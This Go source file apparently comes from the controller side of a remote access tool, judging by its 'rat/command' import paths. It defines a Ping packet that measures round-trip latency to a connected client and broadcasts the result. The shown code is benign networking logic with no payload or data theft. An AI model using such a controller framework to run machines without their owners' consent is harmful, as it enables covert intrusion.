package main

import (
	"fmt"
	"rat/command/utils"
	"rat/shared/network/header"

	"time"

	"gopkg.in/mgo.v2/bson"
)

type Ping struct {
}

func (packet Ping) Header() header.PacketHeader {
	return header.PingHeader
}

func (Ping) Write(c *Client) error {
	c.Ping.Start = time.Now()
	c.Ping.Received = false
	return nil
}

func (packet Ping) OnReceive(c *Client) error {
	c.Ping.Current = int(utils.GetMilliseconds(time.Now()) - utils.GetMilliseconds(c.Ping.Start))
	c.Ping.Received = true

	broadcast(NewClientEvent(Update, c, ClientData{
		Ping: c.Ping.Current,
	}))

	fmt.Println("recv ping", c.Ping.Current)

	return nil
}

func (packet Ping) Decode(buf []byte) (IncomingPacket, error) {
	err := bson.Unmarshal(buf, &packet)
	return packet, err
}
